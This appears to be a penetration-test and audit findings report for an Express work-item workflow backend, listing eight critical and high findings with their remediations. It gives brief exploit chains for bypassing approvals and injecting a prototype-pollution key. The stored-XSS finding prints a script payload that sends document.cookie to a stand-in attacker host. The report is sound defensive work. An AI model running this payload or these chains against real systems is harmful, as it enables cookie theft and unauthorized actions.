🔴 Critical

F01 Critical Confirmed Live Exploit Zero Authentication on All API Routes

Sources: SAST-01 · COMP-01 · COMP-02 · PEN-001 · RED-001 · RED-002

File: Source/Backend/src/app.ts (all routes)

The Express application mounts zero authentication middleware. Every endpoint — CRUD, state transitions, approvals, dispatches, and the Prometheus metrics endpoint — is accessible to any unauthenticated HTTP client. This is the root cause for approximately 80% of all other findings in this report.

Remediation: Implement JWT or session-based authentication middleware applied globally in app.ts before any route mounting. Introduce RBAC (user, operator, admin). Gate privileged actions (approve, dispatch, override) behind admin roles. Sprint 1.
Also addresses: COMP-01, COMP-02, COMP-11, and eliminates ~80% of attack surface.
F02 Critical Confirmed Live Exploit Manual Approve Bypasses Entire Assessment Pod

Sources: PEN-002 · RED-001

File: Source/Backend/src/routes/workflow.ts (lines 94–142)

Confirmed exploit chain: create → route → POST /:id/approve {"reason":"PENTEST_BYPASS"} (no auth) → dispatch. The entire assessment pod (requirements-reviewer, domain-expert, work-definer, pod-lead) never ran. changeHistory confirms agent: manual-override with no assessment-pod entry. Item reached in-progress status with zero quality gates.

Remediation: Gate manual approve behind admin/elevated role requiring explicit confirmation. Remove from public API surface or add mandatory assessment attestation before manual override is allowed. Sprint 1.
F03 Critical Confirmed Live Exploit overrideRoute: fast-track Corrupts State Machine

Sources: PEN-005 · RED-002

File: Source/Backend/src/routes/workflow.ts (lines 39–64)

Confirmed exploit chain: Create type:feature item (requires full-review + assessment pod) → POST /:id/route {"overrideRoute":"fast-track"} → HTTP 200 with status: approved and route: fast-track. Assessment pod entirely skipped. Secondary: arbitrary strings stored verbatim in the route field, corrupting state machine integrity.

Remediation: Validate overrideRoute strictly against WorkItemRoute enum. Reject any non-enum value with 400. Gate fast-track behind admin role. Add database-level constraint on the route column. Sprint 1.

🟠 High — Confirmed

F04 High Confirmed Uncapped Pagination Dumps Entire Work-Item Store

Sources: SAST-05 · PEN-003 · RED-003

File: Source/Backend/src/routes/workItems.ts

Confirmed: GET /api/work-items?limit=999999999 returns all non-deleted items in one response including full changeHistory, assessments, blockedBy, and blocks. Sequential WI-NNN docIds also reveal total store size (newly created item received WI-066, revealing 65 prior items).

Remediation: Enforce MAX_LIMIT = 100 server-side in findAll. Clamp or reject any value above this. Treat limit=0/NaN as defaulting to 20. Sprint 2.
F05 High Confirmed Webhook Intake Accepts Forged Signatures — Store Flooding

Sources: SAST-02 · PEN-007 · RED-007

File: Source/Backend/src/routes/intake.ts

No HMAC-SHA256 signature verification on POST /api/intake/zendesk or /api/intake/automated. Confirmed: 50 consecutive forged webhook requests (with fake X-Zendesk-Webhook-Signature) were all accepted, flooding the store from 11 to 61 items. No rate limiting.

Remediation: Verify X-Zendesk-Webhook-Signature against HMAC-SHA256(secret, rawBody). Apply express-rate-limit at 10 req/min per IP on intake endpoints. Add idempotency keys. Sprint 2.
F06 High Partial (API confirmed; frontend not exercised) Stored XSS via Unsanitized reason Field

Sources: PEN-009 · RED-006

File: Source/Backend/src/routes/workflow.ts

XSS payload <script>fetch('https://attacker.example.com/?c='+document.cookie)</script> stored verbatim in changeHistory[].reason via POST /:id/reject. Returned raw in GET /api/dashboard/activity. If any frontend component renders reason via innerHTML or dangerouslySetInnerHTML, XSS fires for every user viewing the activity feed.

Remediation: Sanitize reason on ingestion using isomorphic-dompurify. Apply Content-Security-Policy: default-src 'self'. Ensure frontend renders reason via text nodes only. Sprint 2.
F07 High Partial (dashboard pollution confirmed) Prototype Pollution via Unvalidated Intake Enums

Sources: SAST-08 · PEN-004 · RED-004

File: Source/Backend/src/routes/intake.ts

Intake endpoints accept arbitrary strings for type/priority. Confirmed: type:"__proto__" stored verbatim; GET /api/dashboard/summary shows "constructor" as a key in priorityCounts. Prometheus /metrics shows permanently polluted labels (type="__proto__" and a 500-char string) for the process lifetime.

Remediation: Validate type against WorkItemType enum and priority against WorkItemPriority enum in ALL intake routes. Use Object.create(null) for counters built from user-supplied keys. Add maxLength: 64 on all string fields. Sprint 2.
F08 High Confirmed Soft-Deleted Blocker Permanently Gates Dependent Items

Sources: PEN-011 · RED-005

File: Source/Backend/src/services/dependency.ts

Confirmed exploit: Create A and B, add dependency A→B, approve both, DELETE B. POST A/dispatch → permanent HTTP 400 "Cannot dispatch: work item has unresolved blocking dependencies." The onItemResolved cascade is never triggered by DELETE. The dangling blockedBy reference to deleted B permanently gates A. No automated recovery path exists.

Remediation: Call onItemResolved(id) in the DELETE handler before soft-deleting. Or: treat !blocker || blocker.deleted as resolved in computeHasUnresolvedBlockers(). Sprint 3.
